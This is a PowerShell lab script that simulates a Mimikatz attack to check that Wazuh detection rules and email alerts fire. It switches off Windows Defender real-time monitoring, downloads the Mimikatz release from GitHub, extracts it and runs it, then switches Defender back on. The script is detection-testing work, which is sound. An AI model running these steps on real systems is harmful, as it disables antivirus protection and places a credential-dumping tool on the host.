# test-mimikatz.ps1
# SOC Automation Lab — SMALTER 2026
# Simulates a Mimikatz attack to validate the detection pipeline
# WARNING: For lab/testing purposes only. Run in isolated environment.
# Usage: Run as Administrator in PowerShell

Write-Host "[*] Starting Mimikatz simulation..." -ForegroundColor Yellow
Write-Host "[!] WARNING: For isolated lab environment only." -ForegroundColor Red

# Step 1 — Disable realtime monitoring temporarily
Write-Host "[*] Disabling Windows Defender realtime monitoring..." -ForegroundColor Cyan
Set-MpPreference -DisableRealtimeMonitoring $true

# Step 2 — Download Mimikatz (triggers rule 92212)
Write-Host "[*] Downloading Mimikatz — this triggers Wazuh rule 92212..." -ForegroundColor Cyan

Invoke-WebRequest `
  -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" `
  -OutFile "$env:USERPROFILE\Desktop\mimikatz.zip"

# Step 3 — Extract
Write-Host "[*] Extracting archive..." -ForegroundColor Cyan
Expand-Archive `
  -Path "$env:USERPROFILE\Desktop\mimikatz.zip" `
  -DestinationPath "$env:USERPROFILE\Desktop\mimikatz"

# Step 4 — Execute (triggers rule 100002)
Write-Host "[*] Executing Mimikatz — this triggers Wazuh rule 100002..." -ForegroundColor Cyan
Start-Process -FilePath "$env:USERPROFILE\Desktop\mimikatz\x64\mimikatz.exe"

Write-Host "[+] Simulation complete." -ForegroundColor Green
Write-Host "[+] Check Wazuh dashboard and your email for alerts." -ForegroundColor Green
Write-Host "[+] Expected time to alert: < 30 seconds." -ForegroundColor Green

# Step 5 — Re-enable Defender
Write-Host "[*] Re-enabling Windows Defender..." -ForegroundColor Cyan
Set-MpPreference -DisableRealtimeMonitoring $false
